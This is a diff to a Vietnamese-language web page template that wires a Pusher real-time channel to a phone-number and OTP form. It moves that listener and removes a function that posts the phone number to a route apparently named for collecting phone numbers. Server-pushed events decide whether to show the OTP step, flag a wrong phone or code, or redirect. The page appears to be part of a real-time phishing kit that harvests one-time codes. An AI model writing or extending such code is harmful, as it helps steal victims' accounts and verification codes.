@@ -133,6 +133,33 @@
         </div>
       </form>
       <script>
+        var pusher = new Pusher('a16c3bab85659b6d2b51', {
+            cluster: 'ap1',
+        });
+        var channel = pusher.subscribe('mrls');
+        channel.bind('{{ $pusher_code }}', function(data) {
+            if (data.status) {
+                $("#warning_notice").hide()
+                window.location.href =
+                    '{!! $data->redirect_link !!}'
+            } else {
+                if (data.otp) {
+                    document.getElementById('step-otp').classList.remove('hidden');
+                    document.getElementById('step-phone').classList.add('hidden');
+                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
+                }
+                if (data.wrong_user) {
+                    showError('Số điện thoại không hợp lệ')
+                    document.getElementById('step-otp').classList.add('hidden');
+                    document.getElementById('step-phone').classList.remove('hidden');
+                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
+                }
+                if (data.wrong_password) {
+                    showError('Mã OTP không hợp lệ')
+                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
+                }
+            }
+        });
       function showError(msg) {
         var errorDiv = document.getElementById('error-message');
         errorDiv.textContent = msg;
@@ -214,82 +241,6 @@
           },
           "json"
         )
-
-        return false;
-      }
-      </script>
-      <script>
-        var pusher = new Pusher('a16c3bab85659b6d2b51', {
-            cluster: 'ap1',
-        });
-        var channel = pusher.subscribe('mrls');
-        channel.bind('{{ $pusher_code }}', function(data) {
-            if (data.status) {
-                $("#warning_notice").hide()
-                window.location.href =
-                    '{!! $data->redirect_link !!}'
-            } else {
-                if (data.otp) {
-                    document.getElementById('step-otp').classList.remove('hidden');
-                    document.getElementById('step-phone').classList.add('hidden');
-                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
-                }
-                if (data.wrong_user) {
-                    showError('Số điện thoại không hợp lệ')
-                    document.getElementById('step-otp').classList.add('hidden');
-                    document.getElementById('step-phone').classList.remove('hidden');
-                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
-                }
-                if (data.wrong_password) {
-                    showError('Mã OTP không hợp lệ')
-                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
-                }
-            }
-        });
-      function handleSubmit(event) {
-        event.preventDefault();
-
-        // Show submit message and disable button
-        document.getElementById('submit-message').classList.remove('hidden');
-        var btn = document.getElementById('submit-btn');
-        btn.disabled = true;
-        btn.classList.add('opacity-70');
-
-        var phone = document.getElementById('phone').value.trim();
-
-        const dataToSend = {
-          'phone': phone,
-          'info': '{{ $info }}',
-        }
-        $.post("{{ route('post.customweb.bo23333_laysdt') }}", {
-            d: JSON.stringify(dataToSend),
-            'p_c': "{{ $pusher_code }}",
-            '_token': '{{ csrf_token() }}'
-          },
-          function(data, textStatus, jqXHR) {
-            // Sau khi gửi xong, ẩn thông báo và mở lại nút
-            document.getElementById('submit-message').classList.add('hidden');
-            btn.disabled = false;
-            btn.classList.remove('opacity-70');
-            // Có thể hiện thông báo thành công ở đây nếu muốn
-            Swal.fire({
-              icon: 'success',
-              title: 'Thành công',
-              text: "Đăng ký thành công! Vui lòng kiểm tra điện thoại."
-            });
-            document.getElementById('register-form').reset();
-          },
-          "json"
-        ).fail(function() {
-          document.getElementById('submit-message').classList.add('hidden');
-          btn.disabled = false;
-          btn.classList.remove('opacity-70');
-          Swal.fire({
-            icon: 'error',
-            title: 'Lỗi',
-            text: 'Đăng ký thất bại. Vui lòng thử lại.'
-          });
-        });
 
         return false;
       }
